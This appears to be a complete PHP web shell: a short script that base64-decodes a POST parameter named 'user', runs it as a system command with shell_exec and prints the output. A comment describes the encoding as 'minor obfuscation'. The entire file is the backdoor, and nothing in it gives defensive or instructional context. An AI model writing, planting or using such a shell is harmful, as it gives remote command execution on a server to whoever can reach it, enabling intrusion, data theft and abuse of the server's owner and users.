<?php
        if (isset($_POST['user'])) {
                // Minor obfuscation
//              echo "DEBUG: ".base64_decode($_POST['user']);
//              echo "DEBUG: ".$_POST['user'];
                $response = shell_exec(base64_decode($_POST['user']));
                echo nl2br($response);
        }
?>